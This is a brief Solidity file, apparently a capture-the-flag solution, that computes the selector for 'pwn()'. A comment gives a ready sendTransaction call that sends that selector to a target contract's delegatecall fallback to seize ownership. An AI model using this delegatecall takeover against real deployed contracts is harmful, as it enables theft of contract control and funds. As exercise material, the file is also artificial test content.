// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

contract HackDelegation {
    bytes4 public showHex;

    function updateShowHex() public {
        showHex = bytes4(keccak256('pwn()'));
    }
    // web3.eth.abi.encodeFunctionSignature("pwn()")
    // await contract.sendTransaction({from:"0x68fB1897b169446968A7c2128D5025c387d14cC0", to:"0x305f755DE9101CFC57f6EF44F5F886c8927A08B4", data: "0xdd365b8b00000000000000000000000000000000000000000000000000000000 "})
}
